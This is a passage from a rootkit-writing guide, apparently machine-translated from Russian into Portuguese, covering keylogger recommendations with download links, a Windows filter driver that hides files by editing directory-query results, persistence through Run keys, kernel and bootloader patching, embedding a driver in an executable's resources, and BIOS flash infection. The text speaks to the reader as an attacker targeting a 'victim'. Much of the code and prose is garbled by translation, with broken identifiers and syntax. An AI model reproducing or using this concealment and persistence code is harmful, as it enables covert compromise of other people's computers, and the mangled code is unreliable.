Typedef boolean bool; 
Parece ser tudo.Agora você precisa criar makefil e compilar 
motorista. 
7.6.Teclados prontos -feitos 
Você está com preguiça de escrever seu próprio sniffer?Eu posso recomendar verificado
Hora do teclado da ganchoEncontre na internet não é 
Será difícil.Além disso, o gancho está escrito há tanto tempo que em 
Você pode encontrar suas versões para Win 3.11 e Windows XP. 
O programa começa e não se manifesta.Seu comportamento depende 
das configurações no arquivo de configuração.Lá você pode indicar se haverá 
Hookdump mostram a interface ao iniciar se ela carregará 
automaticamente, o que exatamente precisa ser interceptado - os eventos do teclado e// 
Ou os eventos do mouse, em que arquivo você precisa gravar todas as teclas. 
O programa é muito bom, mas tem uma desvantagem: dói "
Ligado ”, portanto, mesmo os antivírus mais antigos o determinam.E mais adiante: 
Você precisa de acesso físico ao computador para instalar o programa
Ru.As primeiras versões do gancho também precisavam fazer com isso de forma independente
No Registro para Lançamento Automático. 
Obviamente, além do gancho, existem outros programas.Sobre
exemplo, 
V 
Arquivo 
http://www.sources.ru/builder/ks.rar 
Co
O teclado pronto para 
O mesmo princípio que gancho.Você pode ler sobre isso no site 
http: // www.Linha dura.Ru/3/37/3579.Lá você encontrará um link para o dele 
fonte. 
A criação da amigdiária do teclado é descrita em muitos artigos.Por exemplo, 
Bhttp: //hackzone.stsland.ru/specxakep/s004/074/1.html ru ru
É novo, como escrever um sniffer usando o Visual C, não o DDK. 
190

pagina: 190

Capítulo 8. Oculto de arquivo 
Rootkits

pagina: 191

Uma das funções mais importantes de Rutkita é a ocultação dos arquivos do próprio Rutkin
e arquivos prescritos em seu arquivo de configuração Rutkin.
No Capítulo 6, examinamos a interceptação da ORORMAÇÃO DE ZWQUERYSYSTYMLNF
para ocultar processos;Da mesma maneira, você pode interceptar a função
ZwQueryDirectoryFile e ocultar arquivos.Mas este método tem dois abaixo
Statka: Em primeiro lugar, é relativamente facilmente detectado e, em segundo lugar,
Não permite ocultar os arquivos localizados em seções gerais.Usando
Drivers de vários níveis, podemos nos livrar dessas deficiências.
Como sempre, vamos começar com a função do motorista:
Pdevice_Object d r i v e _ d e v i c e s [2 6];
Ntstatus d r i v e r e n t r y (em pdriverjdbject pdriver,
Em punicode_string
Pregpath)
{
// Matrizes de bits
ULONG GONGABLEABLESSRIVES = 0;
ULONG DRIVESTOHOOK = 0;
// o restante do código de inicialização ...
for (i = 0; i <= irp_mj_maximum_function; i ++)
{
pdriver-> majorFunction [i] = Dispatchfunção;
}
pdriver-> fastiodispatch = my_fastiohook;
for (i = 0; i <26; i ++) drive_devices [i] = null;
Get_drivs_for_hook (ShaokableDabledRives)
;
// driveStohook = discos que interceptaremos
set_drive_hook (ShaokableDabledRives, driveStohook, pdriver);
}
A função de expedição será nosso único processador para todos
Tipos IRP.
192

pagina: 192

Capítulo 8. Oculto de arquivo 
Aqui instalamos a tabela FastLodispatch contendo
O vocabulário das chamadas do Fastio para o método de comunicação - o método de comunicação 
Drivers do sistema de arquivos: 
Fast_io despacho my_fastiohook = 
Tamanho de 
(Fast_io_dispatch) 
, Assim, 
Filtrofastiochceckifpossível, 
FilterFastiioread, 
Filtrofastlowrite, 
FiltrofastloQueryBasicinfo, 
FiltrofastioQuerustandardInfo, 
Filtrofastiolock, 
Filtrofastlounlocksingle, 
Fiiterfastlounlockall, 
Fil 
Terfast 
EU 
OUnlockahbyKey, 
FiltrofastiodeviceControl, 
Filtrofastfloacquirefile, 
Fi1terfastiiorleaseFile, 
Filtrofastlodetachdevice, 
FiltrofastioQueryNetworkOpenInfo, 
Filtrofastioaccquireformodwrite, 
Filtrofastlomdlread, 
FiltrofastiomdlreadComplete, 
Filtrofastiopreparemdlwrite, 
FiltrofastlomdlwriteComplete, 
Filtrofastfastloreadcompressado, 
FiltrofastiowritEcompressed, 
FiltrofastlomdlreadCompressed, 
FiltrofastlomdlWriteCompleteCompressed, 
FiltrofastloQueryopen, 
FiltrofastloreLeaseFormodWrite, 
Filtrofastfloacquireforclush, 
FiltrofastloreLeaseForCcLush 
Informações mais detalhadas sobre o Fastio, bem como sobre o trabalho com arquivo 
Você pode obter o sistema no sistema de referência do NT DDK. 
Get_drives_f ou_hook retorna uma lista de discos para os quais 
Você pode instalar uma armadilha.A lista não incluirá os seguintes discos: 
• 
discos cujo tipo não pode ser determinado; 
• 
discos nos quais não há catálogo de raiz; 
• 
Rodas de troca (discos, CDs, Flash-Diski). 
Não faz sentido colocar arquivos ocultos nesses discos, então excluímos 
eles da lista.Estamos interessados ​​nos seguintes tipos: 
7 ZPK 665 
193

pagina: 193

Rootkits 
• 
Drive_fixed - disco fixo e instável (disco rígido); 
• 
Drive_rem0te - disco remoto (rede); 
• 
Drive_ramdisk é um disco colocado em RAM. 
Listagem 8.1.Determinação de discos para os quais a instalação de uma armadilha é possível 
Ntstatus get_drives_for_hook (drives dword ^) 
{ 
Process_devicemap_information dev_map; 
Status ntstatus; 
int drive; 
// 2 
6 bits à direita correspondem aos discos disponíveis/acessíveis 
DWORD Alldrives, Disponíveis; 
if (drives == null) retorna statusjjnSucessful; 
Status = zWQuerylnformationProcess ((manipular) oxffffff, 
ProcessDevicemap, & dev__map, sizeof (dev_map), null); 
if (! nt_success 
(status)) status de retorno; 
// Obtenha uma lista de discos 
Alldrives = dev_map.query.drivemap; 
Avaldrives = Alldrives; 
para (drive = 0; unidade <32; ++ unidade) 
{ 
IF (Alldrives & (1 drive)) 
{ 
Switch (dev_map.query.driveType [drive]) 
{ 
Case drivejjn conhecida: 
Case drive_no_ro0t_dir: 
Disponíveis e 
= ~ (1 << unidade); 
Quebrar; 
Case drive_removable: 
Disponíveis & = ~ (1 << unidade); 
Quebrar; 
Case drive_cdrom: 
Disponíveis S = ~ (1 << unidade); 
Quebrar; 
} 
} 
*unidades = disponibilização; 
Status de retorno; 
A função set_drive_hook (listando 8.2) define as próprias armadilhas para 
Discos disponíveis. 
194

pagina: 194

Capítulo 8. Oculto de arquivo 
Listagem 8.2.Instalação de armadilhas 
Void set_drive_hook (em Pulong PhookabledRives, 
Em Ulong DriveStestook, 
Em pdriver_object pdriver) 
{ 
Ulong Drive, eu, dirige; 
Ulong Bit; 
Unidades = *phookabledRives; 
para (drive = 0; unidade <26; ++ unidade) 
{ 
Bit = 1 << unidade; 
If ((bit & drives) && (bit & driveStohook)) 
{ 
if (! Hook_drive (unidade, pdriver)) 
( 
// excluindo um disco de discos, 
// se você não pudesse instalar uma armadilha 
Unidades & = -bit; 
} 
Outro 
{ 
para (i 
= 
0;I <26;I ++) 
( 
if (drive_devices [i] == drive_devices [drive]) 
Unidades |. 
; 
Caso contrário, if ((bit & drives) &&! (Bit & driveStohook)) 
{ 
// Remova a armadilha dos discos especificados 
para (i = 0; i <26; i ++) 
( 
if (drive_devices [i] == drive_devices [drive]) 
{ 
desarbruir_drive (i); 
Unidades e = - 
(
1 << 
eu); 
} 
PhookabledRives = unidades; 
Resta escrever as funções de Hook_Drive e desarbrugar_drive.Vamos começar com 
UNSOK_DRIVE - É muito curto e simples: 
195

pagina: 195

Rootkits
Void desmaiar_drive (em Ulong Drive)
(
Phook_extense Hook_ext;
se
(Drive_devices [drive])
{
Hook_Ext = drive_devics [drive]-> Devicextance;
Hook_Ext -> Hooked = false;
}
)
A função Hook_Drive é fornecida na Listagem 8.3.Leia cuidadosamente
Comentários, e tudo ficará claro para você.
Listagem 8.3.Instalação de uma armadilha diretamente em um disco lógico
Boolean Hook_Drive (em Ulong Drive, em Pdriver_Object Pdriver)
{
Io_status_block io_status;
Lidar com file_handle;
Object_attributes atributos;
Pdevice_object sysdevice;
Pdevicejdbject HookDevice;
Unicode_string fname_unicode;
Pfile_fs_attribute_information file_attributes;
ULONG FILE_FS_ATTRINUTES_SIZE;
Wchar fname [] = L "\\ Dosdevices \\ C: \\";
Status ntstatus;
ULONG I;
Pfile_object file_ob;
Phook_extense Hook_ext;
if (drive> = 26) retorna false;// disco de discos inaceitáveis
// Verifique se já existe uma armadilha para este disco
if (drive_devices [drive]! = nulo)
(
Hook_Ext = drive_devics [drive]-> drivextance;
Hook_Ext-> Hooked = true;
Retornar true;
}
fname [12] = (char)
('C+unidade);// Nome do disco
Rtllnitunicodestring (sfname_unicode, fname);
// Abra o catálogo raiz do volume
InitializeObjecttttributes (SATTRIBUTES, & fname_unicode,
Obj_case_insensitive, nulo, nulo);
Status = zwcreatefile
(& file_handle,
Sincronize!
Satributes, & io_status, null, 0,
Compartilhar de arquivos Read i
Arquivo de compartilhamento de arquivos, arquivo aberto,
196

pagina: 196

Capítulo 
8. Ocualização 
arquivos 
File_synchronus_io_noalert | 
File_directory_file, null, 
0); 
if (! nt_status 
(status)) 
Retorna falso; 
// Usando o descritor de arquivo para procurar um objeto do arquivo 
Status = obreferenceoObjectByHandle (file_handle, file_read_data, 
Null, kernelmode e file_ob, null); 
if (! nt_status (status)) 
{ 
// se não conseguirmos obter um objeto do arquivo de acordo com o seu 
// descritor, retornar false 
Zwclose 
(File_handle) 
; 
Retorna falso; 
} 
// Obtenha um objeto do dispositivo de acordo com o objeto de arquivo 
sysdevice = iogeTreLatedDeviceObject (file_ob); 
if (! SysDevice) 
{ 
Obderef 
ErenceObject 
(File_ob); 
Zwclose 
(File_handle); 
Retorna falso; 
} 
// Compare o dispositivo resultante com já interceptado. 
// Se estamos falando de discos de rede, diferentes letras de disco 
// pode se referir ao mesmo dispositivo 
para 
(
EU 
= 
0;I <26;EU 
+ 
+) 
{ 
if (drive_devices [i] == sysdevice) 
{ 
Obdereferencepbject 
(File_ob); 
Zwclose 
(File_handle); 
drive_devices [drive] = sysDevice; 
Retornar true; 
} 
} 
// Crie um objeto do dispositivo e anexe -o a 
// dispositivo de sistema de arquivos 
Status = OcialedEDevice (Pdriver, sizeof (Hook_extension), NULL, 
SysDevice-> DeviceType, SysDevice-> Características, Falso, 
ShookDevice); 
se 
( 
! 
{ 
Obderef 
ErenceObject 
(File_ob); 
Zwclose 
(File_handle); 
Retorna falso; 
} 
// Redefina o sinalizador de inicialização do dispositivo. 
// Se isso não for feito, então na cadeia de dispositivos 
// não será possível colocar o dispositivo acima do nosso 
197

pagina: 197

Rootkits 
HookDevice-> sinalizadores s = ~ do_device_initializing; 
HookDevice-> sinalizadores | = 
(sysdevice-> sinalizadores & (do_buffered_io) i (do_direct_io)); 
Hook_Ext = HookDevice-> DeviceExtension; 
Hook_Ext-> LogicalDrive = 'A'+Drive; 
Hook_Ext-> FileSystem = SysDevice; 
Hook_Ext-> Hooked = true; 
Hook_Ext-> type = Standard; 
// под língua 
status = ioattachDeviceByTointer (HookDevice, SysDevice); 
if (! nt_success (status)) 
( 
Obdereferência 
(file_ob) 
; 
Zwclose 
(file_handle) 
; 
retorna falso; 
) 
// ээо NTFS-ииоª? 
file_f 
S_ATTRINUTES_SIZE = 
sizeof (file_fs_attribute_information) + maxpathlen; 
Hook_Ext-> fsattributes «(pfile_fs_attribute_information); 
Exallocatepool 
(Non -Pagedpool, 
file_fs_attrinutes_size); 
if (hook_ext-> fsattributes && 
! Nt_success (IoQueryVolumelNformation (file_ob, 
file_attributes, file_f 
S_ATTRINUTES_SIZE, 
Hook_Ext-> fsattributes, & file_fs_attrinutes_size)))) 
{ 
// при сбое у нас не будет атрибутов этой файловой системы 
Exfreepool (Hook_ext-> fsattributes) 
; 
Hook_Ext-> fsattributes = null; 
1 
// закрыыаем мййй и ибновлHеHе сиfia 
ObdereferenceObject 
(FileJob) 
; 
Zwclose 
(file_handle); 
drive_devices [drive] = HookDevice; 
retornar true; 
Mantenci онов пntas
нока ззеершающей н €, ызыаааемй иисетчером ызы оаааееndia 
окнчаниии орработои irp: 
NTSTATUS DISPATCHFUNCTION (em Device_Object PDevice, no PIRP PIRP) 
{ 
Pio_stack_location currentIrpstack; 
currentlrpstack = ioGetCurrentLrpStackLocation (PLRP); 
IocopyCurrentLrpStackLocationTonext (PLRP); 
// você 
IosetCompletionRoutine (PLRP, conclusãofunc, nulo, verdadeiro, verdadeiro, 
FALSO) 
; 
198

pagina: 198

Capítulo 
8. Ocualização 
arquivos 
Return iCalldriver (Hook_Ext-> FileSystem, PIRP); 
} 
A conclusão final da função está diretamente envolvida em 
ocultação desses arquivos (listando 8.4). 
Listagem 8.4.A função final 
Ntstatus deleclenfunc (em pdevice_object pdevice, 
No PIRP PIRP, no contexto pvoid) 
( 
Pio_stack_location plrp_stack; 
PLRP_STACK = IOGETCURENTLRPSTACKLOCATION (PIRP); 
if (pirp_stack-> majorfunction == irp_mj_directory_control && 
pirp_stack-> minorfunction == irp_mn_query_directory && 
KegetCurrentlrql 
() ~ Passive_level && 
Pirp_stack-> paramemeters.QueryDirectory.FileInformationClass 
FileBothDirectoryInformation) 
{ 
Pfile_both_dir_information volátil querybuffer = null; 
Pfile_both_dir_information volátil nextBuffer = null; 
Comprimento de ulong;// comprimento do boofer 
Dword t_size = 0;// tamanho total 
DWord tamanho = 0; 
Esconders booleanos = false;// a bandeira da necessidade de ocultar o arquivo 
Mudança booleana = false;// Sinalizador de alterações na lista 
Contagem ulong = 0; 
Querybuffer = (pfile_both_dir_information) pirp-> userBuffer; 
Comprimento = pirp-> iostatus.information; 
se (comprimento> 0) 
f 
fazer 
Dbgprint ("nome do arquivo [%ws] \ n", 
Querybuffer-> nome do arquivo); 
// Neste ponto, você pode analisar os nomes dos arquivos 
/ e ocultar os arquivos necessários, 
// Instalando a bandeira Ocultar: 
// 
hide = true; 
// Mas isto não é o suficiente.Rutkin também deve remover 
// Registro de arquivo correspondente da QueryBuffer. 
// Esta é uma lista coerente. 
se && count == 0) 
• EU 
II, nosso elemento é o primeiro 
Na lista. 
// Se for o único, você pode excluir 
// toda a lista 
if (pirp_stack-> sinalizadores == sl_return_single_nentry) 
EU 
I (QueryBuffer-> NextEntryOffset == 0)) 
{ 
199

pagina: 199

Outro 
{ 
// exclua a lista e redefina seu tamanho 
Rtlzeromemery (QueryBuffer, 
Sizeof (file_both_dir_information))) 
T tamanho t = 0; 
// existe o próximo elemento da lista 
t_size -= QueryBuffer-> NextEntryOffset; 
Temp = exallocatepool (Pagedpool, t_size); 
if (temp! = nulo) 
{ 
// mudamos os elementos da lista por 1 
// para a esquerda através da memória temporária 
Rtlcopymemory ( 
Temp, 
( 
(Pbyte) QueryBuffer + 
QueryBuffer-> NextEntryoffset) 
t_size); 
Rtlzeromemery (QueryBuffer, 
T_size + 
QueryBuffer-> NextEntryoffset) 
Rtlcopymemory (QueryBuffer, 
Temp, t_size); 
Exfreepool (temp); 
} 
// Defina uma bandeira que fala que 
// que querybuffer é alterado 
Mudança = true; 
} 
Else if ((contagem> 0) && 
(QueryBuffer-> NextEntryOffset! = 0) && (ocultar)) 
( 
// Remova o elemento do meio da lista 
Tamanho = ( 
(Pbyte) inputBuffer + 
pirp-> iostatus.information) -
(Pbyte) QueryBuffer -
QueryBuffer-> NextEntryOffset; 
Temp = exallocatepool (Pagedpool, tamanho); 
if (temp! = nulo) 
{ 
Rtlcopymemory (temp, 
(Pbyte) QueryBuffer + 
QueryBuffer-> NextEntryoffset), 
tamanho); 
t_size -= QueryBuffer-> NextEntryOffset; 
Rtlzeromemery (QueryBuffer,

pagina: 200

Capítulo 
8. 
Ocultação 
arquivos 
Tamanho + 
QueryBuffer-> NextEntryOffset); 
Rtlcopymemory (querybuffer, temp, tamanho); 
Exfreepool (temp); 
} 
// ele esquece de definir a bandeira de mudança 
Mudança = true; 
) 
Else if ((contagem> 0) && 
(QueryBuffer-> NextEntryoffset == 0) && (ocultar)) 
( 
// Exclua o último elemento da lista: 
// necessário apenas para alterar o comprimento da lista 
Tamanho = ( 
(Pbyte) inputBuffer + 
P!
(Pbyte) QueryBuffer; 
NextBuffer-> NextEntryOffset = 0; 
t_size -= tamanho; 
) 
Contagem += 1; 
se ( 
! 
Mudar) 
{ 
NextBuffer = QueryBuffer; 
QueryBuffer = 
(Pfile_both_dir_information) ( 
(Pbyte) QueryBuffer + 
QueryBuffer-> NextEntryOffset); 
} 
) While (QueryBuffer! = NextBuffer); 
// assim que terminamos de processamento, 
// precisamos definir o tamanho do novo buffer no IRP 
pirp-> iostatus.information = t_size; 
if (pirp-> pendente de retorno) 
Iomarklrppening (PLRP) 
; 
} // if (comprimento> 0) 
} // if (pirp_stack ~> majorfunção 
Retornar pirp-> iostatus.status; 
} 
Espero que a informação fornecida seja suficiente para você
Eles levaram o básico dos motoristas de filtro e seu uso para ocultar 
arquivos e catálogos. 
201

pagina: 201

Capítulo 9.
Foi através
Recarregar
•
Revisão de métodos automáticos
Carregando Rutkin
•
Segredos de re-arquivos
•
Um pouco sobre BIOS
Rootkits

pagina: 203

Bem, aprendemos a criar rotas.Escrevemos o motorista, carregamos 
Está na memória e aproveite o poder do computador da vítima ... antes de Peres
Carregando.Após a reinicialização, não haverá sentido de Rutkita: ele passará
Mentir no disco e se tornará uma presa fácil de qualquer antivírus. 
9.1.Visão geral dos métodos de carregamento automático Rutkin 
Existem várias maneiras de sobreviver nas condições de reinicialização. 
De que maneira você escolher é resolver apenas para você.Escolha este método 
o que seria fácil de implementar, mas difícil de detectar. 
Para o carregamento automático de Rutkin das maneiras mais aceitáveis 
são: 
• 
Usando a tecla Run.Nas chaves 
Hkcu \ software \ 
Microsoft \ Windows \ CurrentVersion \ Run 
e hklm \ software \ 
Microsoft \ Windows \ CurrentVersion \ Run 
listado 
pró
Gramas que começam automaticamente ao carregar o sistema. 
Este método é mais adequado para um programa regular do que para 
Motoristas.É verdade que você pode prescrever um carregador de inicialização de um motorista lá ... mas 
Há também uma desvantagem inalesável deste método: a maioria dos trenós
Os utilitários de tare são necessariamente vistos para a chave de execução e suspeitos 
O programa de automóveis será detectado rapidamente.O mesmo 
Refere -se ao arquivo win.ini. 
• 
Registro do motorista.O método é simples, mas bastante efeito
tun.Será difícil detectar o motorista com antivírus, porque 
Após o carregamento, você pode tentar ocultar a seção correspondente 
Registro.Você não pode esconder a chave de corrida: muitas suspeitas 
Isso vai causar. 
204

pagina: 204

Capítulo 9. Recarregamento 
Registro Rutkin como um plug -in de algum tipo
Zhenya.Se você tem certeza absoluta de que o usuário iniciará isso 
A aplicação após a reinicialização, esse método é adequado.Apenas para
Rutkin Loader na forma de um plug -in para o Internet Explorer geralmente de cada vez 
revelado pelo detector de spyware mais simples, sem mencionar 
antivírus. 
Lançamento de Trojan ou arquivo infectado.Aqui você tem que
evocar o antivírus para que ele já seja lançado em infectado 
forma.A dificuldade é que você não sabe exatamente o que anti
O vírus é instalado pelo usuário, e as táticas da luta podem Varyiro
derramar dependendo do antivírus e até de sua versão. 
Modificação do arquivo núcleo.Este método é o mais difícil, mas também
Meu eficaz.Se você salvar o disco modificado 
O núcleo do sistema, então ninguém pode "cavar" para você: 
Rutkin carregará o próprio núcleo.E detectar a substituição do núcleo pode
Apenas um programa de um exame técnico e forense. 
Nem todo usuário está disponível.Não se esqueça apenas 
que a quantidade de controle do arquivo do núcleo mudará, então você precisa 
Modifique também o carregador de inicialização do núcleo. 
Modificação do carregador do sistema.Você não pode manter a traição
nia no arquivo do núcleo e corrigir o núcleo antes de cada lançamento das forças 
carregador de sistemas.Este método é bom porque o papel de parede permite
Programa de TI de Exame.Afinal, o administrador vai escanear 
disco rígido, conectando -o a outro computador, ou seja, nosso 
O núcleo não carrega e permanece inalterado.É verdade, paranóidal
O administrador pode digitalizar separadamente e o carregador de inicialização ... 
9.2.Segredos de re-arquivos 
Suponha que você tenha escolhido um método de carregamento automático da raiz usando
Execute chamando a chave.O carregador do driver será iniciado (arquivo. EHE). 
Além dele, você deve armazenar em algum lugar o motorista (o arquivo .sys) e seu 
Arquivo de configuração (arquivo .ini).Quanto mais arquivos, mais fáceis eles são 
detectar ... mas, para nossa felicidade, esses três arquivos podem ser "embalados" em um 
- arquivo de carregador executável. 
O truque é operar os recursos do formato de executável 
arquivos re.Este formato bem documentado fornece não
Quantas seções destinadas a armazenar outros arquivos binários. 
O arquivo executável durante seu trabalho pode "auto -preenchimento", 
205

pagina: 205

Rootkits 
Para extrair esses dados e ... o que ele fará com eles depende apenas da imaginação 
desenvolvedor.Observe que nós, biscoitos, não usamos novamente 
Não há erros no software, mas estamos indo apenas para o mal
Para usar uma oportunidade completamente legal. 
A propósito, por que essa oportunidade foi introduzida?Imagine que não há
O aplicativo PORCE usa um arquivo gráfico - por exemplo, um ícone.Pró
Um produto Gram consiste em um arquivo executável e um gráfico
único.O que acontecerá se o usuário esquecer de copiar o ícone para si mesmo 
Ou a entrega intencionalmente?Depende das intenções do desenvolvedor.Talvez 
Para ser, o aplicativo se recusará a começar, citando a ausência de
arquivos em andamento.Talvez ele cai.Ou talvez ele exiba em vez disso 
O ícone é algum tipo de desgraça.Aqui para evitar a situação quando 
Os arquivos auxiliares (recursos) podem ser perdidos e eles criaram o templo
O tópico deles nos "bolsos" do arquivo executável. 
Qualquer coisa pode servir como um recurso - o próprio programa determina a estrutura
Tours de dados e métodos de acesso a eles.Agora vamos escrever uma função de
implicando na seção de recursos do arquivo SYS que contém o código do driver.Esse 
A função causará um carregador de inicialização Rutkin. 
Listagem 9.1.Removendo o motorista do EHE-FILE 
Bool ExtractSysFile (Char *Resourceename) 
( 
Recurso HRSRC; 
Hglobal Resource_Global; 
Caracter não identifcado * 
File_ptr; 
Não assinado long * f_size; 
Manuseio f_handle; 
Recurso = FindreSource (null, // o próprio arquivo ECHE serve como fonte 
Resourceename, 
"Binário"); 
if (! Recurso) 
Retorna falso; 
// Leia o recurso encontrado 
Resource_global = loadResource (null, recurso); 
if (! Resource_Global) 
Retorna falso; 
F^_Size = sizeofresource 
( 
Nulo, recurso); 
File_ptr = (char não assinado *) LockResource (Resource_Global); 
if (! file_ptr) 
Retorna falso; 
// grava o arquivo de recurso no disco 
// sob o nome Resourceename.sys. 
206

pagina: 206

Capítulo 9. Recarregamento
/ / e eles poderiam sob o nome config.sys,
Para que ninguém adivinhe.
Char fname [64];
Snprintf (fname, 62, "%s.sys", nome do recurso);
F_handle = createfile (fname,
File_all_access,
0, null, create_always,
0, nulo);
if (f_handle == invalid_handle_value)
{
introror = getLasterRor ();
if ((error == error_alread_exists) || (erro == 32))
{
// tudo está em ordem - apenas o arquivo já existe
Retornar true;
}
Printf ("Não é possível extrair %s. Código de erro = %d", fname, erro);
Retorna falso;
}
// Registre o recurso no disco
Enquanto (f_size--)
{
Wr longo não assinado;
Writefile (f_handle, file_ptr, 1, swr, null);
File_ptr
+
+
;
}
CloseHandle (f_handle)
;
Retornar true;
9.3.Um pouco sobre BIOS
A maneira mais confiável de sobreviver ao reiniciar um computador é
Assine diretamente em seu BIOS.Nesta seção, vou sugerir em
como fazer isso.Não vou dar procedimentos prontos para uso, mas fornecendo
LIU certo material para reflexão.
O software não começa com o sistema operacional.
No momento em que a energia está ligada, o computador sobre o sistema operacional ainda está
Ele não sabe nada.Ele realiza vários programas de auto -teste (post -
Energia no auto -teste): verifica o adaptador de vídeo, memória, discos rígidos, etc.
Além dos programas de verificação, existem outros programas de serviço, você
Preenchendo certas ações - por exemplo, a entrada/conclusão mais simples.
E de que mais informação é exibida ao carregar se não houver subprograma
conclusão?O acesso a essas funções pode ser obtido através de vários
Interrupções de software (int) - Tudo isso você sabe, não estaremos nisso
Porra.
207

pagina: 207

Rootkits 
Um local especial é ocupado pelo grupo - carrega a sala de operações
O sistema, mais precisamente, chama o carregador do sistema operacional com um difícil 
disco e dá a ele controle.E o próprio carregamento do sistema operacional 
Seus próprios controles de bootloader. 
Todos esses programas formam BIOS (sistema básico de entrada/saída) - BASIC 
Sistema de entrada/saída.De um modo geral, o código de inicialização inicial 
(Startup de computador) O BIOS não está incluído, mas desde este código e 
Os programas BIOS são registrados em um microcircuito, por simplicidade aceita
Em seguida, chame tudo o sistema básico de entrada/saída.BIOS às vezes está errado
Vilna é atribuído ao hardware, pois é apresentado em 
o sistema com um microchip físico.De fato, o BIOS é "neutro 
Território ”, uma ponte entre hardware e software. 
O BIOS é registrado em uma memória dependente de energia especial.Mais cedo, 
Para reescrever o BIOS, era necessário extraí -lo fisicamente (para materno
O pagamento, essa memória dependente de energia é uma pequena 
lasca).O próprio registro foi realizado por um dispositivo separado - o programador do BIOS. 
Daí o nome do processo de gravação do BIOS - "firmware". 
Recentemente, o BIOS foi registrado na memória dependente de energia, cumprindo
aninhado pela Flash Technology, que permite que você reescreva BIOS sem Phys
A extração do chip em si e mesmo sem um programador é programaticamente. 
Para mudar o BIOS, você precisa de uma nova versão do BIOS, que precisa ser gravada 
na memória flash e no programa de carregamento que fará um registro.Na nossa 
No papel da nova versão do BIOS, nosso Rutkit será. 
Você deve entender que a memória flash não é borracha, então nossa raiz 
deve ser compacto.Normalmente, o BIOS não ocupa toda a memória flash: 
Os fabricantes de computadores deixam um local de "reserva" em caso de boca
Nova versão (portanto, mais volumosa) do BIOS.Aqui 
Vamos gravar nosso Rutkit Place.Não mudaremos as funções do BIOS, um 
Basta expandir o BIOS adicionando novas funções a ele - as funções de nosso 
Rutkin. 
Resta resolver uma pergunta - como o programa do carregador cairá sobre quem
A vítima Pudter?Existem duas maneiras: o primeiro consiste em físico
Stupa para o computador - você se instalará em algum tipo de rutkit
Ser um pretexto.O segundo é usar algum tipo de trojan ou explorar para 
Carregando de um servidor remoto do programa de carregamento, que instalará 
Rutkin.Que maneira de usar é resolver apenas para você. 
Antes de passar para o próximo ponto, devemos entender por nós mesmos 
duas coisas.Primeiro: em alguns computadores, há proteção contra a gravação em 
208

pagina: 208

Capítulo 9. Recarregamento
BIOS.Isso pode ser, por exemplo, saltador.Até você instalá -lo em
Uma certa posição, no BIOS, não funcionará para escrever nada.Aqui já
Você não pode ficar sem acesso físico.
Segundo: se você precisar modificar o roteador do BIOS ou algum
Em qualquer outro sistema interno, o programa de carregamento não é usado
Lazi.Tais sistemas não permitem programas estranhos.Se
BIOS desse sistema pode ser atualizado; então, em qualquer caso, você precisa de física
acesso a este sistema, por exemplo, para extrair BIOS e instalar
Está no programador para gravação.
9.3.1.Memória flash
O chip de memória flash está instalado em todos os computador modernos
ré.No sistema, é apresentado como um dispositivo conectado ao endereço
O espaço do Flash Pamyu é controlado pelo chipset da placa -mãe.Exatamente
O chipset permite ou proíbe o acesso à memória flash.
Se a memória flash estiver conectada ao espaço direcionado geral, então com ka
A quem começa a abordar?A memória flash está localizada nos endereços superiores
memória.Por exemplo, se o processador puder abordar 4 GB de memória e volume
A memória flash EM é de 128 kilobytes, então a memória flash começa com o endereço
Oxoffcooo (4 GB - 128 kb).A primeira instrução do código de carregamento é
Bebendo em oxoffffo.
Como o processador ganha acesso a esta seção da memória no início
seu trabalho?Quando a energia é ativada (ou reiniciar) o processador
Localizado no modo real.Além disso, quando a energia é ativada, defina
Vários registros são baseados:
•
Sinalizadores = 0002h e vm e rf bits e sua expansão são redefinidos;
•
Registro CR0: Os bits são zero PG, TS, EM, MP e RE;
•
Cs = fooh;
•
EIP = oooofffOH;
•
Ds = es - ss = fs = gs = ooooh;
•
Registre DX: informações sobre o tipo de processador.
Se você instalar registros dessa maneira, o processador começa a executar
Instruções concedidas no endereço físico Oxoffo.Consulte Mais informação
Você pode ler sobre isso no livro de M. “Processadores Pentium -ll,
Athlon e outros.
209

pagina: 209

Rootkits 
Agora vamos falar sobre os chips de memória flash.Eles são todos diferentes e 
Feito de acordo com várias tecnologias.Não existe um único padrão, tudo depende 
fabricante.Os seguintes tipos de memória flash são mais comuns: 
• 
Memória do flash sectorado.Tem setor 
estrutura.Um exemplo é o microcircuito Intel 
28F00BX -T/2V, com 4 setores - Main (112 kb), dois setores 
4 kb contendo dados RPR e tamanho de carregamento tamanho 8 
KB.Total de 128 kb. 
• 
Memória flash paginada.Toda a memória antes
colocado na forma de uma página, cujo tamanho é igual ao tamanho de todo 
Memória flash. 
• 
Memória do tipo celular (pequenos setores flash).A memória é dividida em 
Setores de um determinado tamanho, como 128 bytes.Por exemplo
O rum pode servir como um chip SST 28x040. 
Para programaticamente "obter" a memória flash, você precisa de certo 
A maneira de programar os registros de chipset da placa -mãe.Mas aqui 
Uma pequena surpresa espera por você.Como os fabricantes de chipset não são quando
Mantenha um único padrão para acesso à memória flash e, em seguida, para cada 
A sequência de ações do chipset para obter acesso será diferente. 
Você terá que escrever um código dependente de hardware, ou seja, sob a mãe 
Taxa de um fabricante específico (para um chipset específico).É improvável que você tenha 
Funcionará para escrever uma ferramenta trabalhando com todos os chipsets possíveis. 
Vou te contar um segredo que às vezes clássico programas de acesso para flash-
Memória como awdflash e amiflash não funcionou em computadores em que 
Seu BIOS "nativo" (respectivamente prêmio ou AMI) está instalado, pois 
Chipsets e algoritmos para seu trabalho em diferentes placas -mãe são diferentes. 
Além de tudo isso, você terá que enfrentar outro acampamento subaquático
ele.Em diferentes placas -mãe, existem diferentes maneiras de proteger a gravação
XI Flash Memory.Para alguns, este é um jumper (jumper) que proíbe 
Ou uma gravação de permissão.E alguns são usados
Métodos de besteira para proteger a memória flash (especialmente pecando 
Através da).É impossível considerar todos os métodos possíveis de proteção pela força 
o fato de que, enquanto você descreve os métodos existentes, novo 
- Esse processo é interminável.Na internet, você pode encontrar uma descrição de proteção
Você é uma memória flash de um fabricante de chipset específico. 
Não descreveremos o código de registro do BIOS.Eu acho que você entende o porquê.Uma vez
Fabricantes de BIOS, diferentes versões da BIOS, diferentes placas -mãe, 
diferentes esquemas de proteção do BIOS e muitos outros fatores que afetam 
Escrevendo um programa universal.E escreva um programa trabalhando 
210

pagina: 210

Capítulo 9. Recarregamento 
Somente com uma certa versão do BIOS de um determinado fabricante, é 
Portanto, não escreva nada. 
Se você estiver interessado, posso recomendar os seguintes recursos: 
• 
http://www.wasm.ru/article.php?article=1013001 -astas 
sobre como colocar o programa em ROM e executá -lo antes de lançar 
sistema operacional; 
• 
